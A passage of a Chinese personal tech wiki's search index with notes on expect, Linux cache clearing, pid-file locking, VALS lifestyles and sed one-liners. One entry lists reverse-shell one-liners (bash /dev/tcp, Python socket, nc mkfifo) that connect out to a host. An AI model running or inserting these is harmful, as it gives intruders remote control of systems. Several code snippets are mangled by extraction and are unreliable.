it.","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"expect","date":"2019-09-06T00:00:00.000Z","path":"wiki/计算机/linux/devtools/expect/","text":"Expect是Unix系统中用来进行自动化控制和测试的软件工具，相当于手动输入命令行。 替代品:python的pexpect. 参考： https://www.ibm.com/developerworks/cn/education/linux/l-tcl/l-tcl-blt.html TCL语言脚本语言，Tool Command Language，在仪表领域被用得很多。 主要命令expect/send等待输出/输入 spawn创建进程 interactautoexpect用这调命令可以自动录制expect脚本 expect操作串口打开串口设备文件： 1234exec 5exec 6>/dev/ttyS1read LINE &6","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"linux缓存回收","date":"2019-09-06T00:00:00.000Z","path":"wiki/计算机/linux/linux缓存回收/","text":"12345# free total used free shared buffers cachedMem: 26892 13296 13596 2068 420 3320-/+ buffers/cache: 9556 17336Swap: 0 0 0 其中cached是内存中缓存，其中有一部分是可以用命令回收的。（比如/dev/shm里也占着空间，但无法被回收） 注意清Cache、swap并不是个必要的操作，可能会带来麻烦。 江湖传言，保险起见sync要执行两次！因为这命令不可靠 Linux MemFree与MemAvailable的区别 via: https://blog.51cto.com/xujpxm/1961072 2、MemFree：空闲内存数 表示系统尚未使用的内存。MemUsed=MemTotal-MemFree就是已被用掉的内存。 3、MemAvailable：可用内存数 应用程序可用内存数。系统中有些内存虽然已被使用但是可以回收的，比如cache/buffer、slab都有一部分可以回收，所以MemFree不能代表全部可用的内存，这部分可回收的内存加上MemFree才是系统可用的内存，即：MemAvailable≈MemFree+Buffers+Cached，它是内核使用特定的算法计算出来的，是一个估计值。它与MemFree的关键区别点在于，MemFree是说的系统层面，MemAvailable是说的应用程序层面。 How to Clear RAM Memory Cache, Buffer and Swap Space on Linux via: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/ How to Clear Cache in Linux?1. Clear PageCache only. 1# sync; echo 1 > /proc/sys/vm/drop_caches 2. Clear dentries and inodes. 1# sync; echo 2 > /proc/sys/vm/drop_caches 3. Clear PageCache, dentries and inodes. 1# sync; echo 3 > /proc/sys/vm/drop_caches Explanation of above command. sync will flush the file system buffer. Command Separated by “;” run sequentially. The shell wait for each command to terminate before executing the next command in the sequence. As mentioned in kernel documentation, writing to drop_cache will clean cache without killing any application/service, command echo is doing the job of writing to file. If you have to clear the disk cache, the first command is safest in enterprise and production as “...echo 1 > ….” will clear the PageCache only. It is not recommended to use third option above “...echo 3 >” in production until you know what you are doing, as it will clear PageCache, dentries and inodes. How to Clear Swap Space in Linux?you want to clear Swap space, you may like to run the below command. 1# swapoff -a && swapon -a Also you may add above command to a cron script above, after understanding all the associated risk. Now we will be combining both above commands into one single command to make a proper script to clear RAM Cache and Swap Space. 12345# echo 3 > /proc/sys/vm/drop_caches && swapoff -a && swapon -a && printf '\\n%s\\n' 'Ram-cache and Swap Cleared'OR$ su -c \"echo 3 >'/proc/sys/vm/drop_caches' && swapoff -a && swapon -a && printf '\\n%s\\n' 'Ram-cache and Swap Cleared'\" root","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"sudo","date":"2019-09-06T00:00:00.000Z","path":"wiki/计算机/linux/tools/sudo/","text":"特定用户sudo免输密码/etc/sudoers: 12","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"pid-file","date":"2019-09-06T00:00:00.000Z","path":"wiki/计算机/linux/userspace/pid-file/","text":"via: http://vinllen.com/pid-filehe-jin-cheng-fu-ben/ 1.如何防止启动多个副本 为了防止启动一个进程的多个副本，需要在写的时候申请文件锁，一个进程一旦申请文件锁后，会一直锁住该pid文件，直到进程退出，这样也就达到了只启动一个副本的目的。 实例代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const string LOCKFILE = \"/var/run/agent.pid\"; const mode_t LOCKMOD = (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);int lockfile (int fd) { struct flock fl; fl.l_type = F_WRLCK; fl.l_start = 0; fl.l_whence = SEEK_SET; fl.l_len = 0; return fcntl(fd, F_SETLK, &fl);}int already_running() { int fd; char buf[16]; fd = open(LOCKFILE.c_str(), O_RDWR | O_CREAT, LOCKMOD); if (fd < 0) { printf(\"ERROR: cann't open pid file: %s\\n\", LOCKFILE.c_str()); return -1; } if (lockfile(fd) < 0) { if (errno == EACCES || errno == EAGAIN) { close(fd); printf(\"WARNING: process already run\\n\"); return 0; } printf(\"ERROR: cann't lock pid file: %s error: %s\\n\", LOCKFILE.c_str(), strerror(errno)); return -2; } ftruncate(fd, 0); stringstream ss; ss < getpid() < endl;","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"userspace","slug":"计算机/linux/userspace","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/userspace/"}]},{"title":"反弹shell","date":"2019-09-06T00:00:00.000Z","path":"wiki/计算机/信息安全/反弹shell/","text":"nc做反弹shellhttps://xz.aliyun.com/t/2549https://www.freebuf.com/articles/system/10632.html 用这个接住： 1$ nc -l -p 2333 -vvv Bash1bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 反复连接： 1$ while true; do bash -i >& /dev/tcp/127.0.0.1/2333 0>&1; sleep 10; done Python1$ python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' NC1234$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f |/bin/sh -i 2>&1 |nc 10.0.0.1 2333 >/tmp/f# 正向$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f |/bin/sh -i 2>&1 |nc -l -p 2333 >/tmp/f","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"信息安全","slug":"计算机/信息安全","permalink":"http://wiki.noodlefighter.com/categories/计算机/信息安全/"}]},{"title":"c语言中的时间","date":"2019-09-06T00:00:00.000Z","path":"wiki/计算机/编程/C/c语言中的时间/","text":"参考： http://zetcode.com/articles/cdatetime/ 时间格式化：https://www.cnblogs.com/kaituorensheng/p/3922919.html","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"VALS_value-and-lifesylte","date":"2019-09-02T00:00:00.000Z","path":"wiki/心理学/vals-value-and-lifesylte/","text":"https://en.wikipedia.org/wiki/VALS VALS由社会科学家和消费者未来学家Arnold Mitchell及其在SRI International的同事于1978年开发。它立即被广告公司所接受，目前作为SRI咨询服务部门的产品提供。 VALS在很大程度上依赖于哈佛社会学家大卫·里斯曼和心理学家亚伯拉罕·马斯洛的作品。 米切尔使用统计数据来确定态度和人口统计问题，这些问题有助于将成年美国消费者分为以下九种生活方式之一： 生存者（4％）：认为活着就好的人； 受难者（7％）：虽然身处社会底层，但立志奋发向上的人； 归属者（35％）：重视传统，保守性强的人； 竞争者（9％）：奋发向上但未成功的人； 实现目标类型（22％）：已经构建了体制，站在体制顶端的人（？？？）； 我就是我类型（5％）：比起外部世界，更重视内部自我的人； 尝试者类型（7％）：愿意尝试不同事物的人； 社会意识类型（9％）：不仅关照自身，还积极参加社会事务的人； 综合类型（2％）：内外达到平衡统一的类型。 这些问题是根据1,635名美国人及其他重要人物的样本加权得出的，他们在1980年对SRI国际调查做出回应。VALS框架的主要方面是资源（垂直维度）和主要动机（水平维度）。 垂直维度根据人们创新的程度对人们进行细分，并拥有收入，教育，自信，智力，领导技能和能量等资源。 横向维度代表主要动机，包括三种不同的类型： 受知识和原则驱动的消费者主要受理想驱动。这些消费者包括名为思想家和信徒的团体。 以向同行展示成功为动力的消费者主要受成就驱动。这些消费者包括被称为成就者和奋斗者的群体。 受社会或身体活动，多样性和冒险的渴望驱动的消费者主要受到自我表达的驱动。这些消费者包括被称为体验者和制造者的团体。 在矩形的顶部是创新者，他们拥有如此高的资源，他们可以拥有三个主要动机中的任何一个。在矩形的底部是幸存者，他们自满地生活，并且没有上面列出的类型的强烈主要动机。 VALS框架提供了有关每个组的更多详细信息。 基于理解消费者的两个概念，以下类型对应于美国成年人的VALS部分：主要动机和资源。 创新者：这些消费者处于变革的前沿，拥有最高的收入，以及如此高的自尊和丰富的资源，他们可以沉迷于任何或所有自我取向。它们位于矩形上方。作为品味，独立和品格的表达，形象对他们来说很重要。他们的消费者选择是针对“生活中更美好的事物”。 思考者：这些消费者是受理想激励的高资源群体。他们是成熟，负责任，受过良好教育的专业人士。他们的休闲活动以他们的家园为中心，但他们充分了解世界上发生的事情，并对新思想和社会变革持开放态度。他们有很高的收入，但却是实际的消费者和理性的决策者。 信徒。这些消费者是那些受理想驱动的资源匮乏的群体。他们是保守和可预测的消费者，他们喜欢本地产品和知名品牌。他们的生活以家庭，社区和国家为中心。他们有适度的收入。 成就。这些消费者是那些受成就激励的高资源群体。他们是成功的以工作为导向的人，他们从工作和家庭中获得满足感。他们在政治上是保守的，尊重权威和现状。他们青睐成熟的产品和服务，向同行展示他们的成功。 奋斗者。这些消费者是那些受成就驱动的低资源群体。他们的价值观与成就者非常相似，但经济，社会和心理资源较少。风格对他们来说非常重要，因为他们努力效仿他们所钦佩的人。 经历者。这些消费者是那些受自我表达驱动的高资源群体。他们是所有细分中最年轻的，年龄中位数为25岁。他们有很多精力，他们会投入体育锻炼和社交活动。他们是狂热的消费者，在服装，快餐，音乐和其他年轻人的喜爱上花费巨大，特别强调新产品和服务。 庄家。这些消费者是那些受自我表达驱动的人群中资源匮乏的群体。他们是重视自给自足的实际人士。他们专注于熟悉 - 家庭，工作和身体娱乐 - 并且对更广阔的世界没什么兴趣。作为消费者，他们欣赏实用和功能性产品。 幸存者。这些消费者的收入最低。它们的资源太少，无法包含在任何消费者自我定位中，因此位于矩形下方。他们是所有细分市场中最年长的，年龄中位数为61岁。在有限的手段内，他们往往是品牌忠诚的消费者。","tags":[],"categories":[{"name":"心理学","slug":"心理学","permalink":"http://wiki.noodlefighter.com/categories/心理学/"}]},{"title":"sed","date":"2019-09-02T00:00:00.000Z","path":"wiki/计算机/linux/tools/sed/","text":"使用例例1.从配置文件中筛选出某项123bss[0]=wlan0bssid[0]=c8:02:8f:03:3f:d6ssid[0]=9377-5G-open 取出ssid[0]项： 1hostapd_cli -i wlan0 status|sed -n 's/^ssid\\[0\\]=\\(.*\\)/\\1/p' ^匹配行首（对应$匹配行末） -n静默模式，仅打印需要打印的地方 s替换，这里的\\(和\\)是正则分组，\\1表示分组1 p打印命令 例2.修改配置文件中的某项和上一例配置文件格式一样，现在要修改其中某项： 1sed -i 's/^ssid=.*/ssid=abcdefg/' /etc/xxx.conf 技巧集sed命令一次替换多个文本1$ sed -e 's/11/22/' -e 's/55/99/' num.txt SED单行脚本快速参考（Unix 流编辑器） via: http://sed.sourceforge.net/sed1line_zh-CN.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453​-------------------------------------------------------------------------SED单行脚本快速参考（Unix 流编辑器） 2005年12月29日英文标题：USEFUL ONE-LINE SCRIPTS FOR SED (Unix stream editor)原标题：HANDY ONE-LINERS FOR SED (Unix stream editor)整理：Eric Pement - 电邮：pemente[at]northpark[dot]edu 版本5.5译者：Joe Hong - 电邮：hq00e[at]126[dot]com在以下地址可找到本文档的最新（英文）版本： http://sed.sourceforge.net/sed1line.txt http://www.pement.org/sed/sed1line.txt其他语言版本： 中文 - http://sed.sourceforge.net/sed1line_zh-CN.html 捷克语 - http://sed.sourceforge.net/sed1line_cz.html 荷语 - http://sed.sourceforge.net/sed1line_nl.html 法语 - http://sed.sourceforge.net/sed1line_fr.html 德语 - http://sed.sourceforge.net/sed1line_de.html 葡语 - http://sed.sourceforge.net/sed1line_pt-BR.html文本间隔：​-------- # 在每一行后面增加一空行 sed G # 将原来的所有空行删除并在每一行后面增加一空行。 # 这样在输出的文本中每一行后面将有且只有一空行。 sed '/^$/d;G' # 在每一行后面增加两行空行 sed 'G;G' # 将第一个脚本所产生的所有空行删除（即删除所有偶数行） sed 'n;d' # 在匹配式样“regex”的行之前插入一空行 sed '/regex/{x;p;x;}' # 在匹配式样“regex”的行之后插入一空行 sed '/regex/G' # 在匹配式样“regex”的行之前和之后各插入一空行 sed '/regex/{x;p;x;G;}'编号：​-------- # 为文件中的每一行进行编号（简单的左对齐方式）。这里使用了“制表符” # （tab，见本文末尾关于'\\t'的用法的描述）而不是空格来对齐边缘。 sed = filename | sed 'N;s/\\n/\\t/' # 对文件中的所有行编号（行号在左，文字右端对齐）。 sed = filename | sed 'N; s/^/ /; s/ *\\(.\\{6,\\}\\)\\n/\\1 /' # 对文件中的所有行编号，但只显示非空白行的行号。 sed '/./=' filename | sed '/./N; s/\\n/ /' # 计算行数 （模拟 \"wc -l\"） sed -n '$='文本转换和替代：​-------- # Unix环境：转换DOS的新行符（CR/LF）为Unix格式。 sed 's/.$//' # 假设所有行以CR/LF结束 sed 's/^M$//' # 在bash/tcsh中，将按Ctrl-M改为按Ctrl-V sed 's/\\x0D$//' # ssed、gsed 3.02.80，及更高版本 # Unix环境：转换Unix的新行符（LF）为DOS格式。 sed \"s/$/`echo -e \\\\\\r`/\" # 在ksh下所使用的命令 sed 's/$'\"/`echo \\\\\\r`/\" # 在bash下所使用的命令 sed \"s/$/`echo \\\\\\r`/\" # 在zsh下所使用的命令 sed 's/$/\\r/' # gsed 3.02.80 及更高版本 # DOS环境：转换Unix新行符（LF）为DOS格式。 sed \"s/$//\" # 方法 1 sed -n p # 方法 2 # DOS环境：转换DOS新行符（CR/LF）为Unix格式。 # 下面的脚本只对UnxUtils sed 4.0.7 及更高版本有效。要识别UnxUtils版本的 # sed可以通过其特有的“--text”选项。你可以使用帮助选项（“--help”）看 # 其中有无一个“--text”项以此来判断所使用的是否是UnxUtils版本。其它DOS # 版本的的sed则无法进行这一转换。但可以用“tr”来实现这一转换。 sed \"s/\\r//\" infile >outfile # UnxUtils sed v4.0.7 或更高版本 tr -d \\r outfile # GNU tr 1.22 或更高版本 # 将每一行前导的“空白字符”（空格，制表符）删除 # 使之左对齐 sed 's/^[ \\t]*//' # 见本文末尾关于'\\t'用法的描述 # 将每一行拖尾的“空白字符”（空格，制表符）删除 sed 's/[ \\t]*$//' # 见本文末尾关于'\\t'用法的描述 # 将每一行中的前导和拖尾的空白字符删除 sed 's/^[ \\t]*//;s/[ \\t]*$//' # 在每一行开头处插入5个空格（使全文向右移动5个字符的位置） sed 's/^/ /' # 以79个字符为宽度，将所有文本右对齐 sed -e :a -e 's/^.\\{1,78\\}$/ &/;ta' # 78个字符外加最后的一个空格 # 以79个字符为宽度，使所有文本居中。在方法1中，为了让文本居中每一行的前 # 头和后头都填充了空格。 在方法2中，在居中文本的过程中只在文本的前面填充 # 空格，并且最终这些空格将有一半会被删除。此外每一行的后头并未填充空格。 sed -e :a -e 's/^.\\{1,77\\}$/ & /;ta' # 方法1 sed -e :a -e 's/^.\\{1,77\\}$/ &/;ta' -e 's/\\( *\\)\\1/\\1/' # 方法2 # 在每一行中查找字串“foo”，并将找到的“foo”替换为“bar” sed 's/foo/bar/' # 只替换每一行中的第一个“foo”字串 sed 's/foo/bar/4' # 只替换每一行中的第四个“foo”字串 sed 's/foo/bar/g' # 将每一行中的所有“foo”都换成“bar” sed 's/\\(.*\\)foo\\(.*foo\\)/\\1bar\\2/' # 替换倒数第二个“foo” sed 's/\\(.*\\)foo/\\1bar/' # 替换最后一个“foo” # 只在行中出现字串“baz”的情况下将“foo”替换成“bar” sed '/baz/s/foo/bar/g' # 将“foo”替换成“bar”，并且只在行中未出现字串“baz”的情况下替换 sed '/baz/!s/foo/bar/g' # 不管是“scarlet”“ruby”还是“puce”，一律换成“red” sed 's/scarlet/red/g;s/ruby/red/g;s/puce/red/g' #对多数的sed都有效 gsed 's/scarlet\\|ruby\\|puce/red/g' # 只对GNU sed有效 # 倒置所有行，第一行成为最后一行，依次类推（模拟“tac”）。 # 由于某些原因，使用下面命令时HHsed v1.5会将文件中的空行删除 sed '1!G;h;$!d' # 方法1 sed -n '1!G;h;$p' # 方法2 # 将行中的字符逆序排列，第一个字成为最后一字，……（模拟“rev”） sed '/\\n/!G;s/\\(.\\)\\(.*\\n\\)/&\\2\\1/;//D;s/.//' # 将每两行连接成一行（类似“paste”） sed '$!N;s/\\n/ /' # 如果当前行以反斜杠“\\”结束，则将下一行并到当前行末尾 # 并去掉原来行尾的反斜杠 sed -e :a -e '/\\\\$/N; s/\\\\\\n//; ta' # 如果当前行以等号开头，将当前行并到上一行末尾 # 并以单个空格代替原来行头的“=” sed -e :a -e '$!N;s/\\n=/ /;ta' -e 'P;D' # 为数字字串增加逗号分隔符号，将“1234567”改为“1,234,567” gsed ':a;s/\\B[0-9]\\{3\\}\\>/,&/;ta' # GNU sed sed -e :a -e 's/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta' # 其他sed # 为带有小数点和负号的数值增加逗号分隔符（GNU sed） gsed -r ':a;s/(^|[^0-9.])([0-9]+)([0-9]{3})/\\1\\2,\\3/g;ta' # 在每5行后增加一空白行 （在第5，10，15，20，等行后增加一空白行） gsed '0~5G' # 只对GNU sed有效 sed 'n;n;n;n;G;' # 其他sed选择性地显示特定行：​-------- # 显示文件中的前10行 （模拟“head”的行为） sed 10q # 显示文件中的第一行 （模拟“head -1”命令） sed q # 显示文件中的最后10行 （模拟“tail”） sed -e :a -e '$q;N;11,$D;ba' # 显示文件中的最后2行（模拟“tail -2”命令） sed '$!N;$!D' # 显示文件中的最后一行（模拟“tail -1”） sed '$!d' # 方法1 sed -n '$p' # 方法2 # 显示文件中的倒数第二行 sed -e '$!{h;d;}' -e x # 当文件中只有一行时，输入空行 sed -e '1{$q;}' -e '$!{h;d;}' -e x # 当文件中只有一行时，显示该行 sed -e '1{$d;}' -e '$!{h;d;}' -e x # 当文件中只有一行时，不输出 # 只显示匹配正则表达式的行（模拟“grep”） sed -n '/regexp/p' # 方法1 sed '/regexp/!d' # 方法2 # 只显示“不”匹配正则表达式的行（模拟“grep -v”） sed -n '/regexp/!p' # 方法1，与前面的命令相对应 sed '/regexp/d' # 方法2，类似的语法 # 查找“regexp”并将匹配行的上一行显示出来，但并不显示匹配行 sed -n '/regexp/{g;1!p;};h' # 查找“regexp”并将匹配行的下一行显示出来，但并不显示匹配行 sed -n '/regexp/{n;p;}' # 显示包含“regexp”的行及其前后行，并在第一行之前加上“regexp”所 # 在行的行号 （类似“grep -A1 -B1”） sed -n -e '/regexp/{=;x;1!p;g;$!N;p;D;}' -e h # 显示包含“AAA”、“BBB”或“CCC”的行（任意次序） sed '/AAA/!d; /BBB/!d; /CCC/!d' # 字串的次序不影响结果 # 显示包含“AAA”、“BBB”和“CCC”的行（固定次序） sed '/AAA.*BBB.*CCC/!d' # 显示包含“AAA”“BBB”或“CCC”的行 （模拟“egrep”） sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d # 多数sed gsed '/AAA\\|BBB\\|CCC/!d' # 对GNU sed有效 # 显示包含“AAA”的段落 （段落间以空行分隔） # HHsed v1.5 必须在“x;”后加入“G;”，接下来的3个脚本都是这样 sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;' # 显示包含“AAA”“BBB”和“CCC”三个字串的段落 （任意次序） sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;/BBB/!d;/CCC/!d' # 显示包含“AAA”、“BBB”、“CCC”三者中任一字串的段落 （任意次序） sed -e '/./{H;$!d;}' -e 'x;/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d gsed '/./{H;$!d;};x;/AAA\\|BBB\\|CCC/b;d' # 只对GNU sed有效 # 显示包含65个或以上字符的行 sed -n '/^.\\{65\\}/p' # 显示包含65个以下字符的行 sed -n '/^.\\{65\\}/!p' # 方法1，与上面的脚本相对应 sed '/^.\\{65\\}/d' # 方法2，更简便一点的方法 # 显示部分文本——从包含正则表达式的行开始到最后一行结束 sed -n '/regexp/,$p' # 显示部分文本——指定行号范围（从第8至第12行，含8和12行） sed -n '8,12p' # 方法1 sed '8,12!d' # 方法2 # 显示第52行 sed -n '52p' # 方法1 sed '52!d' # 方法2 sed '52q;d' # 方法3, 处理大文件时更有效率 # 从第3行开始，每7行显示一次 gsed -n '3~7p' # 只对GNU sed有效 sed -n '3,${p;n;n;n;n;n;n;}' # 其他sed # 显示两个正则表达式之间的文本（包含） sed -n '/Iowa/,/Montana/p' # 区分大小写方式选择性地删除特定行：​-------- # 显示通篇文档，除了两个正则表达式之间的内容 sed '/Iowa/,/Montana/d' # 删除文件中相邻的重复行（模拟“uniq”） # 只保留重复行中的第一行，其他行删除 sed '$!N; /^\\(.*\\)\\n\\1$/!P; D' # 删除文件中的重复行，不管有无相邻。注意hold space所能支持的缓存 # 大小，或者使用GNU sed。 sed -n 'G; s/\\n/&&/; /^\\([ -~]*\\n\\).*\\n\\1/d; s/\\n//; h; P' # 删除除重复行外的所有行（模拟“uniq -d”） sed '$!N; s/^\\(.*\\)\\n\\1$/\\1/; t; D' # 删除文件中开头的10行 sed '1,10d' # 删除文件中的最后一行 sed '$d' # 删除文件中的最后两行 sed 'N;$!P;$!D;$d' # 删除文件中的最后10行 sed -e :a -e '$d;N;2,10ba' -e 'P;D' # 方法1 sed -n -e :a -e '1,10!{P;N;D;};N;ba' # 方法2 # 删除8的倍数行 gsed '0~8d' # 只对GNU sed有效 sed 'n;n;n;n;n;n;n;d;' # 其他sed # 删除匹配式样的行 sed '/pattern/d' # 删除含pattern的行。当然pattern # 可以换成任何有效的正则表达式 # 删除文件中的所有空行（与“grep '.' ”效果相同） sed '/^$/d' # 方法1 sed '/./!d' # 方法2 # 只保留多个相邻空行的第一行。并且删除文件顶部和尾部的空行。 # （模拟“cat -s”） sed '/./,/^$/!d' #方法1，删除文件顶部的空行，允许尾部保留一空行 sed '/^$/N;/\\n$/D' #方法2，允许顶部保留一空行，尾部不留空行 # 只保留多个相邻空行的前两行。 sed '/^$/N;/\\n$/N;//D' # 删除文件顶部的所有空行 sed '/./,$!d' # 删除文件尾部的所有空行 sed -e :a -e '/^\\n*$/{$d;N;ba' -e '}' # 对所有sed有效 sed -e :a -e '/^\\n*$/N;/\\n$/ba' # 同上，但只对 gsed 3.02.*有效 # 删除每个段落的最后一行 sed -n '/^$/{p;h;};/./{x;/./p;}'特殊应用：​-------- # 移除手册页（man page）中的nroff标记。在Unix System V或bash shell下使 # 用'echo'命令时可能需要加上 -e 选项。 sed \"s/.`echo \\\\\\b`//g\" # 外层的双括号是必须的（Unix环境） sed 's/.^H//g' # 在bash或tcsh中, 按 Ctrl-V 再按 Ctrl-H sed 's/.\\x08//g' # sed 1.5，GNU sed，ssed所使用的十六进制的表示方法 # 提取新闻组或 e-mail 的邮件头 sed '/^$/q' # 删除第一行空行后的所有内容 # 提取新闻组或 e-mail 的正文部分 sed '1,/^$/d' # 删除第一行空行之前的所有内容 # 从邮件头提取“Subject”（标题栏字段），并移除开头的“Subject:”字样 sed '/^Subject: */!d; s///;q' # 从邮件头获得回复地址 sed '/^Reply-To:/q; /^From:/h; /./d;g;q' # 获取邮件地址。在上一个脚本所产生的那一行邮件头的基础上进一步的将非电邮 # 地址的部分剃除。（见上一脚本） sed 's/ *(.*)//; s/>.*//; s/.*[: /' # 将每一行开头处的尖括号和空格删除（解除引用） sed 's/^> //' # 移除大部分的HTML标签（包括跨行标签） sed -e :a -e 's/]*>//g;/ # 将分成多卷的uuencode文件解码。移除文件头信息，只保留uuencode编码部分。 # 文件必须以特定顺序传给sed。下面第一种版本的脚本可以直接在命令行下输入； # 第二种版本则可以放入一个带执行权限的shell脚本中。（由Rahul Dhesi的一 # 个脚本修改而来。） sed '/^end/,/^begin/d' file1 file2 ... fileX | uudecode # vers. 1 sed '/^end/,/^begin/d' \"$@\" | uudecode # vers. 2 # 将文件中的段落以字母顺序排序。段落间以（一行或多行）空行分隔。GNU sed使用 # 字元“\\v”来表示垂直制表符，这里用它来作为换行符的占位符——当然你也可以 # 用其他未在文件中使用的字符来代替它。 sed '/./{H;d;};x;s/\\n/={NL}=/g' file | sort | sed '1s/={NL}=//;s/={NL}=/\\n/g' gsed '/./{H;d};x;y/\\n/\\v/' file | sort | sed '1s/\\v//;y/\\v/\\n/' # 分别压缩每个.TXT文件，压缩后删除原来的文件并将压缩后的.ZIP文件 # 命名为与原来相同的名字（只是扩展名不同）。（DOS环境：“dir /b” # 显示不带路径的文件名）。 echo @echo off >zipup.bat dir /b *.txt | sed \"s/^\\(.*\\)\\.TXT/pkzip -mo \\1 \\1.TXT/\" >>zipup.bat使用SED：Sed接受一个或多个编辑命令，并且每读入一行后就依次应用这些命令。当读入第一行输入后，sed对其应用所有的命令，然后将结果输出。接着再读入第二行输入，对其应用所有的命令……并重复这个过程。上一个例子中sed由标准输入设备（即命令解释器，通常是以管道输入的形式）获得输入。在命令行给出一个或多个文件名作为参数时，这些文件取代标准输入设备成为sed的输入。sed的输出将被送到标准输出（显示器）。因此： cat filename | sed '10q' # 使用管道输入 sed '10q' filename # 同样效果，但不使用管道输入 sed '10q' filename > newfile # 将输出转移（重定向）到磁盘上要了解sed命令的使用说明，包括如何通过脚本文件（而非从命令行）来使用这些命令，请参阅《sed & awk》第二版，作者Dale Dougherty和Arnold Robbins（O'Reilly，1997；http://www.ora.com），《UNIX Text Processing》，作者Dale Dougherty和Tim O'Reilly（Hayden Books，1987）或者是Mike Arst写的教程——压缩包的名称是“U-SEDIT2.ZIP”（在许多站点上都找得到）。要发掘sed的潜力，则必须对“正则表达式”有足够的理解。正则表达式的资料可以看《Mastering Regular Expressions》作者Jeffrey Friedl（O'reilly 1997）。Unix系统所提供的手册页（“man”）也会有所帮助（试一下这些命令“man sed”、“man regexp”，或者看“man ed”中关于正则表达式的部分），但手册提供的信息比较“抽象”——这也是它一直为人所诟病的。不过，它本来就不是用来教初学者如何使用sed或正则表达式的教材，而只是为那些熟悉这些工具的人提供的一些文本参考。括号语法：前面的例子对sed命令基本上都使用单引号（'...'）而非双引号（\"...\"）这是因为sed通常是在Unix平台上使用。单引号下，Unix的shell（命令解释器）不会对美元符（$）和后引号（`...`）进行解释和执行。而在双引号下美元符会被展开为变量或参数的值，后引号中的命令被执行并以输出的结果代替后引号中的内容。而在“csh”及其衍生的shell中使用感叹号（!）时需要在其前面加上转义用的反斜杠（就像这样：\\!）以保证上面所使用的例子能正常运行（包括使用单引号的情况下）。DOS版本的Sed则一律使用双引号（\"...\"）而不是引号来圈起命令。'\\t'的用法：为了使本文保持行文简洁，我们在脚本中使用'\\t'来表示一个制表符。但是现在大部分版本的sed还不能识别'\\t'的简写方式，因此当在命令行中为脚本输入制表符时，你应该直接按TAB键来输入制表符而不是输入'\\t'。下列的工具软件都支持'\\t'做为一个正则表达式的字元来表示制表符：awk、perl、HHsed、sedmod以及GNU sed v3.02.80。不同版本的SED：不同的版本间的sed会有些不同之处，可以想象它们之间在语法上会有差异。具体而言，它们中大部分不支持在编辑命令中间使用标签（:name）或分支命令（b,t），除非是放在那些的末尾。这篇文档中我们尽量选用了可移植性较高的语法，以使大多数版本的sed的用户都能使用这些脚本。不过GNU版本的sed允许使用更简洁的语法。想像一下当读者看到一个很长的命令时的心情： sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d好消息是GNU sed能让命令更紧凑： sed '/AAA/b;/BBB/b;/CCC/b;d' # 甚至可以写成 sed '/AAA\\|BBB\\|CCC/b;d'此外，请注意虽然许多版本的sed接受象“/one/ 